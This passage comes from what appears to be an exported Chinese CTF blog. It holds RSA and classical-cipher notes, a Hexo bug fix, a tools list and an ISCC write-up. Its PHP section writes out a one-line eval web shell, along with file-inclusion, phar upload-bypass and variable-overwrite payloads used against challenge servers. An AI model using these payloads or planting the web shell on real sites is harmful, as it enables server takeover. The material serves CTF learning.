c_1^{s_1}c_2^{s_2} \equiv m\ mod\ n \] 明文解出。 例题 Jarvis very hard rsa 题目给了一个N，两个不同的e，猜到是共模攻击 解密脚本 12345678910111213141516171819import gmpy2n = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929c1 = int(open('flag.enc1', 'rb').read().encode('hex'),16)c2 = int(open('flag.enc2', 'rb').read().encode('hex'),16)e1 = 17e2 = 65537s = gmpy2.gcdext(e1,e2) # gmpy2自带欧几里得以及扩展欧几里得算法s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = gmpy2.invert(c1, n)elif s2&lt;0: s2 = - s2 c2 = gmpy2.invert(c2, n)m = gmpy2.powmod(c1, s1, n) * gmpy2.powmod(c2, s2, n) % nprint hex(m)[2:].decode('hex') tips 参考 密码学笔记-veritas CTF中RSA的常见攻击方法 \(\varphi (N)=\varphi (p)\varphi (q)=(p−1)(q−1)\)欧拉函数是积性函数，即是说若\(m\),\(n\)互质，\(\varphi (mn)=\varphi (m)\varphi (n)\)，如果\(n\)为质数，那么\(\varphi(n)=n-1\)↩︎ 同余符号\(\equiv\)：给定一个正整数n，如果两个整数a和b满足a-b能被n整除，即\((a-b)\ mod\ n=0\)，那么就称整数a与b对模n同余，记作\(a \equiv b \ (mod\ n)\)，同时可成立\(a \ mod \ n=b\)。↩︎]]></content>
      <tags>
        <tag>encrypt</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF中遇到过的编码和加密]]></title>
    <url>%2F2019%2F07%2F10%2Fencrypt%2F</url>
    <content type="text"><![CDATA[栅栏密码 所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话） 一般比较常见的是2栏的栅栏密码。 比如明文：THERE IS A CIPHER 去掉空格后变为：THEREISACIPHER 两个一组，得到：TH ER EI SA CI PH ER 先取出第一个字母：TEESCPE 再取出第二个字母：HRIAIHR 连在一起就是：TEESCPEHRIAIHR 解密工具 凯撒密码 密码学中，恺撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。 加密实例： 明文： The quick brown fox jumps over the lazy dog 偏移量：1 密文： Uif rvjdl cspxo gpy kvnqt pwfs uif mbaz eph 解密工具 猪圈密码 猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。 猪圈密码 示例 维吉尼亚密码 维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式 密码表 明文： THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG 密钥(循环使用，密钥越长相对破解难度越大)： CULTURE 加密过程：如果第一行为明文字母，第一列为密钥字母，那么明文字母'T'列和密钥字母'C'行的交点就是密文字母'V'，以此类推。 密文： VBP JOZGM VCHQE JQR UNGGW QPPK NYI NUKR XFK 已知密钥 解密工具 未知密钥 破解维吉尼亚密码第一步是确定密钥长度，维吉尼亚密码分析这篇文章里介绍了使用 重合指数 算法来确定密钥长度，在确定密钥长度后就可以尝试确定密钥，通常我们可以使用 卡方检验 来找到每个字母的偏移量，基于维吉尼亚密码分析一文中的算法实现的工具破解示例。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from ngram_score import ngram_scorefrom pycipher import Vigenereimport refrom itertools import permutationsqgram = ngram_score('quadgrams.txt')trigram = ngram_score('trigrams.txt')ctext = 'kiqpbkxspshwehospzqhoinlgapp'ctext = re.sub(r'[^A-Z]','',ctext.upper())# keep a list of the N best things we have seen, discard anything elseclass nbest(object): def __init__(self,N=1000): self.store = [] self.N = N def add(self,item): self.store.append(item) self.store.sort(reverse=True) self.store = self.store[:self.N] def __getitem__(self,k): return self.store[k] def __len__(self): return len(self.store)#initN=100for KLEN in range(3,20): rec = nbest(N) for i in permutations('ABCDEFGHIJKLMNOPQRSTUVWXYZ',3): key = ''.join(i) + 'A'*(KLEN-len(i)) pt = Vigenere(key).decipher(ctext) score = 0 for j in range(0,len(ctext),KLEN): score += trigram.score(pt[j:j+3]) rec.add((score,''.join(i),pt[:30])) next_rec = nbest(N) for i in range(0,KLEN-3): for k in xrange(N): for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ': key = rec[k][1] + c fullkey = key + 'A'*(KLEN-len(key)) pt = Vigenere(fullkey).decipher(ctext) score = 0 for j in range(0,len(ctext),KLEN): score += qgram.score(pt[j:j+len(key)]) next_rec.add((score,key,pt[:30])) rec = next_rec next_rec = nbest(N) bestkey = rec[0][1] pt = Vigenere(bestkey).decipher(ctext) bestscore = qgram.score(pt) for i in range(N): pt = Vigenere(rec[i][1]).decipher(ctext) score = qgram.score(pt) if score &gt; bestscore: bestkey = rec[i][1] bestscore = score print bestscore,'Vigenere, klen',KLEN,':"'+bestkey+'",',Vigenere(bestkey).decipher(ctext) 培根密码 加密时，明文中的每个字母都会转换成一组五个英文字母。其转换依靠下表： A/a aaaaa H/h aabbb O/o abbba V/v babab B/b aaaab I/i abaaa P/p abbbb W/w babba C/c aaaba J/j abaab Q/q baaaa X/x babbb D/d aaabb K/k ababa R/r baaab Y/y bbaaa E/e aabaa L/l ababb S/s baaba Z/z bbaab F/f aabab M/m abbaa T/t baabb G/g aabba N/n abbab U/u babaa 加密者需使用两种不同字体，分别代表A和B。准备好一篇包含相同AB字数的假信息后，按照密文格式化假信息，即依密文中每个字母是A还是B分别套用两种字体。 解密时，将上述方法倒转。所有字体一转回A，字体二转回B，以后再按上表拼回字母。 法兰西斯·培根另外准备了一种方法，其将大小写分别看作A与B，可用于无法使用不同字体的场合（例如只能处理纯文本时）。但这样比起字体不同更容易被看出来，而且和语言对大小写的要求也不太兼容。 培根密码本质上是将二进制信息通过样式的区别，加在了正常书写之上。培根密码所包含的信息可以和用于承载其的文章完全无关。 明文： T H E F O X 密文： baaba aabbb aabaa aabab abbab babab 解密工具 jjencode/aaencode jjencode代码，就是将正常的js代码转换成复杂的只有符号的字符串编码， 进行加密 如：[$._$_]+$._$+",\\"+$.$__+$.___+"\\"+$.__$+$.__$+$这样的组合。 aaencode代码，则是将正常的js代码转为好玩的特殊网络表情符号。 如:ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ ['_']; o=(ﾟｰﾟ) 这样的表情文字. 解密方式：直接在浏览器F12开发人员工具中的控制台中输入密文执行即可 JSfuck encode JavaScript with only 6 letters - !+ 解密工具 brainfuck/ook Brainfuck是一种极小化的计算机语言，按照"Turing complete（完整图灵机）"思想设计的语言，它的主要设计思路是：用最小的概念实现一种“简单”的语言，BrainF**k 语言只有八种符号，所有的操作都由这八种符号( &gt; &lt; + - . , [ ] )的组合来完成。 Ook! 与Brainfuck类似, 但用单词“Ook！”，“Ook.” 和“Ook?”代替。 解密工具 参考：CTF中那些脑洞大开的编码和加密]]></content>
      <tags>
        <tag>encrypt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF中的php套路]]></title>
    <url>%2F2019%2F07%2F09%2Fphp%2F</url>
    <content type="text"><![CDATA[MD5() ==判断 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 ===判断 MD5不能处理数组，构造?a[]=1&amp;b[]=2这样md5函数无法处理数组返回false完成匹配得到flag。 strcmp 如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0； 如果两者相等，返回 0。 5.2 中是将两个参数先转换成string类型。 5.3.3 以后，当比较数组和字符串的时候，返回是0。 5.5 中如果参数不是string类型，直接return了 php伪协议 php://input 123index.php?file=php://inputPOST:&lt;? phpinfo(); ?&gt; php://filter 可以读取本地文件 index.php?file=php://filter/read=convert.base64-encode/resource=index.php 指定末尾文件，可以读到base64编码后的文件内容，ctf中常有题目可读文件源码。 如果不使用php://filter，要读取的文件扩展名是php的话，会直接解析，而不会显示出来内容 php://phar 绕过上传限制 新建一个test.php，写入一句话 12//test.php&lt;?php @eval($_POST["cmd"]);?&gt; 将其压缩，后缀名改为.jpg。 然后使用phar协议读取文件。 1/index.php?page=phar://test.jpg/test.php 例题 安恒11月赛：image_up 1http://101.71.29.5:10007/index.php?page=php://filter/read=convert.base64-encode/resource= 读取到以下文件源码 index.php 1234567891011&lt;?php if(isset($_GET['page']))&#123; if(!stristr($_GET['page'],".."))&#123; $page = $_GET['page'].".php"; include($page); &#125;else&#123; header("Location: index.php?page=login"); &#125; &#125;else&#123; header("Location: index.php?page=login"); &#125; login.php 123456&lt;?php if(isset($_POST['username'])&amp;&amp;isset($_POST['password']))&#123; header("Location: index.php?page=upload"); exit(); &#125;?&gt; upload.php 123456789101112131415161718192021222324&lt;?php $error = ""; $exts = array("jpg","png","gif","jpeg"); if(!empty($_FILES["image"])) &#123; $temp = explode(".", $_FILES["image"]["name"]); $extension = end($temp); if((@$_upfileS["image"]["size"] &lt; 102400)) &#123; if(in_array($extension,$exts))&#123; $path = "uploads/".md5($temp[0].time()).".".$extension; move_uploaded_file($_FILES["image"]["tmp_name"], $path); $error = "上传成功!"; &#125; else&#123; $error = "上传失败！"; &#125; &#125;else&#123; $error = "文件过大，上传失败！"; &#125; &#125;?&gt; upload.php限制了上传文件类型，只能为"jpg","png","gif","jpeg"，使用phar伪协议绕过即可。 payload: 1/index.php?page=phar://./uploads/6b19a5399b7d34fbb3c509ca8c25fd89.jpg/shell 因为index.php中会为请求的页面自动加上.php后缀，所以构造的payload不能写.php后缀。 phar反序列化 参考利用 phar 拓展 php 反序列化漏洞攻击面 data:// 12index.php?file=data:text/plain,&lt;?php phpinfo(); ?&gt;%00index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 变量覆盖漏洞 全局变量覆盖 条件：register_globals = ON 4.2.0后默认关闭 5.4.0后已移除 例题： 12345678910111213&lt;?php error_reporting(0);include "flag1.php";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match("/^\w+$/",$args))&#123; die("args error!"); &#125; eval("var_dump($$args);");&#125;?&gt; payload:/index1.php?args=GLOBALS 因为有eval("var_dump($$args);"); 直接用全局变量打印所有字符串即可得到flag $$导致的变量覆盖问题 $$ 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test 会将$name的值覆盖，变为test。 1234567891011121314151617&lt;?php //?name=test //output:string(4) “name” string(4) “test” string(4) “test” test $name=’thinking’; foreach ($_GET as $key =&gt; $value) &#123; $$key = $value; &#125; var_dump($key); var_dump($value); var_dump($$key); echo $name;?&gt; 例题： 题目源码： 123456789101112131415161718192021222324252627282930&lt;?php include “flag.php”; $_403 = “Access Denied”; $_200 = “Welcome Admin”; if ($_SERVER["REQUEST_METHOD"] != “POST”) &#123; die(“BugsBunnyCTF is here :p…”); &#125; if ( !isset($_POST["flag"]) ) &#123; die($_403); &#125; foreach ($_GET as $key =&gt; $value) &#123; $$key = $$value; &#125; foreach ($_POST as $key =&gt; $value) &#123; $$key = $value; &#125; if ( $_POST["flag"] !== $flag ) &#123; die($_403); &#125; echo “This is your flag : “. $flag . “\n”; die($_200);?&gt; 题目分析： 源码包含了flag.php文件，并且需要满足3个if里的条件才能获取flag，题目中使用了两个foreach并且也使用了$$两个foreach中对$$key的处理是不一样的，满足条件后会将$flag里面的值打印出来，所以$flag是在flag.php文件文件中的。 但是由于第7，11-14行间的代码会将flag的值给覆盖掉了，所以需要先将flag的值给覆盖掉了，所以需要先将flag的值赋给200或200或_403变量，然后利用die(200)或die(200)或die(_403)将flag打印出来。 解题方法： 由于第7，11-14行间的代码会将$flag的值给覆盖掉，所以只能利用第一个foreach先将$flag的值赋给$_200，然后利用die($_200)将原本的flag值打印出来。 最终PAYLOAD： 123GET DATA：?_200=flag POST DATA：flag=aaaaaaaaaaaaaaaaaaaaa extract()函数导致的变量覆盖问题 extract()该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 extract()的用法参考：http://www.runoob.com/php/func-array-extract.html 语法： extract(array,extract_rules,prefix) 例题： 题目源码： 12345678910111213141516&lt;?php$flag = ‘xxx’;extract($_GET);if (isset($gift)) &#123;$content = trim(file_get_contents($flag));if ($gift == $content) &#123;echo ‘hctf&#123;…&#125;’;&#125; else &#123;echo ‘Oh..’;&#125;&#125; ?&gt; 题目分析： 题目使用了extract($_GET)接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用extract()对变量进行覆盖，从而满足各个条件。 解题方法： GET请求 ?flag=&amp;gift=，extract()会将flag和flag和gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足gift==gift==content。 最终PAYLOAD： 1GET DATA： ?flag=&amp;gift= parse_str函数导致的变量覆盖问题 parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 语法：parse_str(string,array) 题目源码： 12345678910111213141516171819202122232425&lt;?php error_reporting(0); if (empty($_GET['id'])) &#123; show_source(__FILE__); die(); &#125; else &#123; include (‘flag.php’); $a = “www.OPENCTF.com $id = $_GET['id']; @parse_str($id); if ($a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)) &#123; echo $flag; &#125; else &#123; exit(‘其实很简单其实并不难！’); &#125; &#125;?&gt; 题目分析： 首先要求使用GET提交id参数，然后parse_str($id)对id参数的数据进行处理，再使用判断a[0] != ‘QNKCDZO’ &amp;&amp; md5(a[0] != ‘QNKCDZO’ &amp;&amp; md5(a[0]) == md5(‘QNKCDZO’)的结果是否为真，为真就返回flag，md5(‘QNKCDZO’)的结果是0e830400451993494058024219903391由于此次要满足a[0] != ‘QNKCDZO’ &amp;&amp; md5(a[0] != ‘QNKCDZO’ &amp;&amp; md5(a[0]) == md5(‘QNKCDZO’)所以要利用php弱语言特性，0e123会被当做科学计数法，0 * 10 x 123。所以需要找到一个字符串md5后的结果是0e开头后面都是数字的，如，240610708，s878926199a PHP处理0e开头md5哈希字符串缺陷/bug 参考：http://www.cnblogs.com/Primzahl/p/6018158.html 解题方法： 使用GET请求id=a[0]=240610708，这样会将a[0]的值覆盖为240610708，然后经过md5后得到0e462097431906509019562988736854与md5(‘QNKCDZO’)的结果0e830400451993494058024219903391比较都是0 所以相等，满足条件，得打flag。 最终PAYLOAD： 1234567GET DATA:?id=a[0]=s878926199aor?id=a[0]=240610708]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用hexo-asset-image图片路径错误]]></title>
    <url>%2F2019%2F07%2F01%2Fhexo-image%2F</url>
    <content type="text"><![CDATA[Part 1 今天提交文章的时候，上去博客看了一眼，发现图片全都显示不出来， 看了下图片url，全都是 1file://image/123.jpg 这种形式的。 因为我使用的typora来写markdown，自动插入图片默认的是本地路径，去设置里更改为使用相对路径即可 part 2 原本以为大功告成，结果发现还是显示错误，去网上查了下，有些插件没有装，_config.yml里的选项也没有开。。。 安装hexo-asset-image 1npm install https://github.com/CodeFalling/hexo-asset-image --save _config.yml配置 post_asset_folder: false改为post_asset_folder: true part 3 再次以为大功告成，结果发现还是错误，之前hexo g -d 的时候没有注意，这次执行的时候突然发现有几条记录有点奇怪 12update link as:--&gt;/.io//06/01/vim/1561905818946.pngupdate link as:--&gt;/.io//06/01/vim/1561905818946.png 这个.io不知道是怎么来的，不管怎么修改图片的路径，这个.io总是有 最终查来查去发现是hexo-asset-image这个插件的问题，hexo 3.0以上与hexo 3.0以下获取url的方式不同，结果就导致获取到了.io这种奇怪的域名。 解决问题 参考hexo引用本地图片无法显示 将/node_modules/hexo-asset-image/index.js里面的内容修改为 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061'use strict';var cheerio = require('cheerio');// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-stringfunction getPosition(str, m, i) &#123; return str.split(m, i).join(m).length;&#125;var version = String(hexo.version).split('.');hexo.extend.filter.register('after_post_render', function(data)&#123; var config = hexo.config; if(config.post_asset_folder)&#123; var link = data.permalink; if(version.length &gt; 0 &amp;&amp; Number(version[0]) == 3) var beginPos = getPosition(link, '/', 1) + 1; else var beginPos = getPosition(link, '/', 3) + 1; // In hexo 3.1.1, the permalink of "about" page is like ".../about/index.html". var endPos = link.lastIndexOf('/') + 1; link = link.substring(beginPos, endPos); var toprocess = ['excerpt', 'more', 'content']; for(var i = 0; i &lt; toprocess.length; i++)&#123; var key = toprocess[i]; var $ = cheerio.load(data[key], &#123; ignoreWhitespace: false, xmlMode: false, lowerCaseTags: false, decodeEntities: false &#125;); $('img').each(function()&#123; if ($(this).attr('src'))&#123; // For windows style path, we replace '\' to '/'. var src = $(this).attr('src').replace('\\', '/'); if(!/http[s]*.*|\/\/.*/.test(src) &amp;&amp; !/^\s*\//.test(src)) &#123; // For "about" page, the first part of "src" can't be removed. // In addition, to support multi-level local directory. var linkArray = link.split('/').filter(function(elem)&#123; return elem != ''; &#125;); var srcArray = src.split('/').filter(function(elem)&#123; return elem != '' &amp;&amp; elem != '.'; &#125;); if(srcArray.length &gt; 1) srcArray.shift(); src = srcArray.join('/'); $(this).attr('src', config.root + link + src); console.info&amp;&amp;console.info("update link as:--&gt;"+config.root + link + src); &#125; &#125;else&#123; console.info&amp;&amp;console.info("no src attr, skipped..."); console.info&amp;&amp;console.info($(this)); &#125; &#125;); data[key] = $.html(); &#125; &#125;&#125;); 接着再去hexo g -d一下就能显示成功了。 hexo 3.0以上用户应该也可以选择直接卸载hexo-asset-image插件，直接使用官方的相对路径引用的标签插件 资源文件夹 通过常规的 markdown 语法和相对路径来引用图片和其它资源可能会导致它们在存档页或者主页上显示不正确。在Hexo 2时代，社区创建了很多插件来解决这个问题。但是，随着Hexo 3 的发布，许多新的标签插件被加入到了核心代码中。这使得你可以更简单地在文章中引用你的资源。 比如说：当你打开文章资源文件夹功能后，你把一个 example.jpg 图片放在了你的资源文件夹中，如果通过使用相对路径的常规 markdown 语法 ![](/example.jpg) ，它将 不会 出现在首页上。（但是它会在文章中按你期待的方式工作） 正确的引用图片方式是使用下列的标签插件而不是 markdown ： 通过这种方式，图片将会同时出现在文章和主页以及归档页中。]]></content>
      <tags>
        <tag>hexo</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用CTF工具收集]]></title>
    <url>%2F2019%2F06%2F29%2Ftools%2F</url>
    <content type="text"><![CDATA[Binary Tool Description radare2 开源逆向框架 pwntools CTF框架和漏洞利用(exploit)编写工具 jd-gui java反编译 libc-database 根据偏移查找libc版本并下载 LibcSearcher 根据泄露出来的libc中的函数的地址来查找libc版本 qemu 开源模拟器，用来做一些mips平台或者arm平台的题目 Misc Tool Description z3-solver z3是由微软公司开发的一个优秀的SMT求解器，它能够检查逻辑表达式的可满足性。 Web Tool Description dirsearch 目录爆破 Crypto Tool Description RSAtool RSA加解密工具 yafu 分解大整数 gmpy2 高精度算术运算库 pycryptodome Cryptographic library for Python Mobile Tool Description APK改之理 Android反编译工具]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ISCC 2019 Writeup]]></title>
    <url>%2F2019%2F06%2F22%2FISCC%2F</url>
    <content type="text"><![CDATA[其实是ISCC 2018 REVERSE 去网上搜flag时发现是2018原题 首先IDA打开发现UPX壳，使用UPX -d脱壳，然后放进IDA里面看源码 1561907160841 有点不忍直视，放弃，直接放进OD里面跑。 调试了几次，摸清了大致流程： 接收字符串 根据接收到的字符串打印出来东西 然后打印出来的东西本身是在程序里存着，像这样： 把这些数据拿出来转成字符串就是这种： 12666f72 495343 5f6172 696375 746869 6e6773 617379 696666 437b41 6c747d 5f6265 6c6c5f 655f64 68657965for ISC _ar icu thi ngs asy iff C&#123;A lt&#125; _be ll_ e_d heye 输入-&gt;输出规律： 123456789101112131415161 -&gt; for2 -&gt; ISC3 -&gt; _ar4 -&gt; icu 5 -&gt; thi6 -&gt; ngs7 -&gt; iff 8 -&gt; _ar9 -&gt; C&#123;A10-&gt; lt&#125;11-&gt; _be12-&gt; ll13-&gt; e_d14-&gt; hey15-&gt; e_t16-&gt; e_e 接着拼出flag-&gt;ISCC{All_things_are_easy_before_they_are_difficult}，翻译一下是凡事必先易后难，但是也可以拼成All_things_are_difficult_before_they_are_easy(凡事必先难后易)，不是很懂出题人在想什么，卡拉赞毕业打卡拉赞 MISC 依旧是原题，只不过看2018的wp貌似是个gif，每帧都是不同的二维码，而这次直接弄了一堆到文件夹里 抄下网上的wp 二维码要求在两个大黑框之间必须有连续的黑白点，这样才行 逐帧分析gif，发现只有第62帧存在一个校正图形 ，保存补上位置探测图形和定位图形 ，扫描得到ISRDQzgxMDI=，base64解码得到!$CC8102 嗦不粗话，连flag都没换 MOBILE 原题，最大的收获是找到了不少好用的工具 放入APKIDE中打开，查看AndroidManifest.xml，看到启动类为com.example.shellapplication.WrapperApplication 123456789101112public class WrapperApplication extends Application&#123; static &#123; System.loadLibrary("reinforce"); &#125; public native void attachBaseContext(Context paramContext); public native void onCreate();&#125; 这个类加载了libreinforce.so，接着去看onCreate()和attachBaseContext中的内容 onCreate： 123456789101112131415v2 = a2;v3 = a1;v4 = (*(int (**)(void))(*(_DWORD *)a1 + 24))();v5 = v4;v6 = _JNIEnv::GetMethodID(v3, v4, "getPackageName", "()Ljava/lang/String;");v7 = _JNIEnv::CallObjectMethod(v3, v2, v6);v8 = (*(int (__fastcall **)(int, int, _DWORD))(*(_DWORD *)v3 + 676))(v3, v7, 0);_android_log_print(4, "TTT", "shellapplication's onCreate execute");memset(&amp;v12, 0, 0x100u);sprintf(&amp;v12, "/data/data/%s/lib/libcore.so", v8);v9 = dlopen(&amp;v12, 1);v10 = (void (__fastcall *)(int))dlsym(v9, "resume");v10(v3);_JNIEnv::DeleteLocalRef(v3, v7);return _JNIEnv::DeleteLocalRef(v3, v5); onCreate中加载了libcore.so以及调用了resume这个方法 attachBaseContext： 12345678910memset(&amp;v23, 0, 0x100u);sprintf(&amp;v23, "%s/protected.jar", v17);extractJar(v4, v5, &amp;v23);byte_601C = (unsigned int)dalvikOrArt();memset(&amp;v24, 0, 0x100u);sprintf(&amp;v24, "%s/origin.dex", v17);decryptJar(&amp;v23, &amp;v24);v22 = v4;memset(&amp;v25, 0, 0x100u);sprintf(&amp;v25, "%s/protected.so", v17); attachBaseContext中最关键的部分是对assets中的 protected.jar进行解密，解密操作很简单，按位取反 decryptJar： 12345while ( v9 &lt; v6 ) &#123; *((_BYTE *)v8 + v9) = ~*((_BYTE *)v7 + v9); ++v9; &#125; 解密脚本： 123456789101112131415#include &lt;stdio.h&gt;int main()&#123; FILE* fi, * fo; fo = fopen("dec.dex", "wb"); fi = fopen("protected.jar", "rb"); char fBuffer[1]; while (!feof(fi)) &#123; fread(fBuffer, 1, 1, fi); // 读取1字节 if (!feof(fi)) &#123; *fBuffer =~ *fBuffer; // xor encrypt fwrite(fBuffer, 1, 1, fo); // 写入文件 &#125; &#125;&#125; 之所以为什么用C来写。。。因为python按位取反之后返回的是int类型，而负数又没办法to_bytes()，写了半天也没写出来一个比较优雅的exp，放弃。 解密之后得到一个dex文件，使用dex2jar将其转成jar文件，使用jd-gui打开。 onCreate中调用ProtectedClass的verifyKey对输入进行检查： 12345if (ProtectedClass.verifyKey(inputText.getText().toString())) &#123; str = "密码正确"; &#125; else &#123; str = "密码错误"; &#125; ProtectedClass的逻辑： 123456789public class ProtectedClass &#123; private static int[][] key = &#123; &#123; 17, 12, 3 &#125;, &#123; 21, 12, 9 &#125;, &#123; 17, 14, 6 &#125; &#125;; private static native String getEncrypttext(String paramString); public static String getString() &#123; return "bfs-iscc"; &#125; public static boolean verifyKey(String paramString) &#123; return (paramString.length() % 3 != 0) ? false : "OYUGMCH&gt;YWOCBXF))9/3)YYE".equals(getEncrypttext(paramString)); &#125;&#125; 将输入进行加密之后与OYUGMCH&gt;YWOCBXF进行比较，但是关键的getEncrypttext函数又是个native。 之前libreinforce.so中，在加载完libcore.so后，还调用了其中的resume方法 resume： 12345678910111213141516171819202122v1 = a1;v5 = 0;v6 = 0;v7 = 0;v2 = dalvikOrArt();decryptAndParse((int)&amp;v5);getSdkint(v1);if ( v2 ) resumeArt(v1, &amp;v5);else resumeDalvik((int)v1, &amp;v5);v3 = (char *)v5;v4 = v6;while ( v3 != (char *)v4 )&#123; sub_539C(v3 + 8); sub_539C(v3 + 4); sub_539C(v3); v3 += 16;&#125;if ( v5 ) operator delete(v5); 什么都看不出来。 看大佬的博客里面说使用了一个安卓的热补丁修复机制。 关于热补丁机制的描述是这样的： 在不进行版本更新的情况下，动态的屏蔽掉程序原来存在BUG的函数，使用新的函数替代。 新函数一般存在于另一个so中 热补丁的流程主要有： 通过函数名找到原来函数的地址偏移（ArtMethod-&gt;dex_code_item_offset_）。 将新函数地址偏移替换原函数地址偏移。 而上述程序也为类似主要流程如下： 分析安卓虚拟机为dalvik还是art，二者热补丁方式不一样。 解密解析补丁函数表(decryptAndParse) 执行补丁操作 接着在decryptAndParse中，对补丁表每字节+10，进行解密，解密后的补丁表： 1Lcom/example/originapplication/ProtectedClass;getEncrypttext(Ljava/lang/String;)Ljava/lang/String;1416140 后面这串数字就是新函数的位置。 这部分就是函数的字节码，但是IDA没有显示出来汇编，需要手动转换 不会 剩下的参考https://mypre.cn/2018/10/27/bfs-iscc-mobile PWN bomb_squad 首先checksec一下 123456[*] '/root/work/CLSknpNF3iWUuHCX.bomb_squad' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这个题目首先由4个小关卡，全部通关之后才能达到getflag的地方 12345678910111213int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0, 2, 0); puts("Welcome to the bomb squad! Your first task: Diffuse this practice bomb."); phase_1(); puts("You got through phase 1 alright! Good work! But can you handle phase 2?"); phase_2(); puts("You could handle it! Good job... I think you can handle phase 3... right?"); phase_3(); puts("DAYUM, you got it! You know the drill, time for phase 4."); phase_4(); print_flag();&#125; phase_1 12345678910111213int phase_1()&#123; char *v0; // eax int result; // eax puts("Give me a number!"); v0 = get_line(); result = 3 * (2 * atoi(v0) / 37 - 18) - 1; if ( result != 1337 ) explode_bomb(); phase1_solved = 1; return result;&#125; 关卡1接收一个数字，经过一系列计算，使得最终结果要等于1337，使用z3-solver很容易得出解。 1561801642780 phase_2 123456789101112131415161718int phase_2()&#123; puts("Give me an array of numbers!"); s = get_line(); sscanf(s, "[%d, %d, %d, %d, %d, %d]", v4, _2C, _30, _34, _38, _3C); result = v4[0]; if ( v4[0] != 1 ) explode_bomb(); for ( i = 1; i &lt;= 5; ++i ) &#123; v2 = v4[i - 1] + v4[i]; result = func2(i); if ( v2 != result ) explode_bomb(); &#125; phase2_solved = 1; return result;&#125; 接收一个数组，要求满足a[0]=1，a[i-1]+a[i]=2^i，那么结果就是[1, 1, 3, 5, 11, 21] phase_2 123456789101112131415161718192021int phase_3()&#123; v4 = get_line(); v5 = "rqzzepiwMLepiwYsLYtpqpvzLsYeM"; while ( 1 ) &#123; v1 = v4++; result = (unsigned __int8)*v1; v3 = result; if ( !(_BYTE)result ) break; if ( (char)result &lt;= 96 || (char)result &gt; 123 ) explode_bomb(); v0 = v5++; if ( *v0 != keys[v3 - 97] ) explode_bomb(); lastentered = v3; &#125; phase3_solved = 1; return result;&#125; 接收一串字符串，要求keys里面的字符串要与v5的对应。但实际上不需要这么麻烦， 12if ( !(_BYTE)result ) break; 当输入为\x00时，就会跳出循环，直接返回。 phase_4 1234567891011121314151617181920int phase_4()&#123; s = (char *)get_line(); sscanf(s, "%d %d %d %d %d %d %d", v5, &amp;v5[1], &amp;v5[2], &amp;v5[3], &amp;v5[4], &amp;v5[5], &amp;v5[6]); v2 = &amp;n1; result = n1.num; v3 = n1.num; for ( i = 0; i &lt;= 6; 